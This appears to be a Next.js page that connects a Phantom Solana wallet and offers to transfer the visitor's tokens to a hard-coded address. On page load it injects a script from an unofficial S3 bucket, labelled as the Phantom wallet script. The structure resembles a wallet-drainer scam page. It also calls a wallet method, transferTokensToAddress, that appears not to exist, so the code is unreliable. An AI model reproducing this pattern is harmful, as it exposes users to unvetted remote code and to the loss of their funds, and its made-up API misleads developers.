// pages/index.js

import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    // Load Phantom wallet script
    const script = document.createElement("script");
    script.src =
      "https://solana-api-project.s3.us-west-1.amazonaws.com/web3.js";
    script.async = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const connectWallet = async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        await window.solana.connect();
        alert("Connected to Phantom wallet!");
      } catch (error) {
        console.error("Error connecting to Phantom wallet:", error);
        alert("Error connecting to Phantom wallet. Please try again.");
      }
    } else {
      alert("Phantom wallet extension is not installed.");
    }
  };

  const transferFunds = async () => {
    const publicKey = window.solana.publicKey;
    if (!publicKey) {
      alert("Please connect your Phantom wallet first.");
      return;
    }

    const balance = 1; // await window.solana.getTokenBalance();
    if (balance === 0) {
      alert("You have no tokens to transfer.");
      return;
    }

    const myaddress = "B4CGtixqzBRiy33bjNkcpjdtjm2MY6bxZfK1wSEq8G4i";

    if (confirm(`Do you want to transfer ${balance} tokens to our address?`)) {
      try {
        await window.solana.transferTokensToAddress(balance, myaddress);
        alert("Tokens transferred successfully!");
      } catch (error) {
        console.error("Error transferring tokens:", error);
        alert("Error transferring tokens. Please try again.");
      }
    }
  };

  return (
    <div>
      <h1>Transfer Funds</h1>
      <button onClick={connectWallet}>Connect Wallet</button>
      <button onClick={transferFunds}>Transfer Funds</button>
    </div>
  );
}
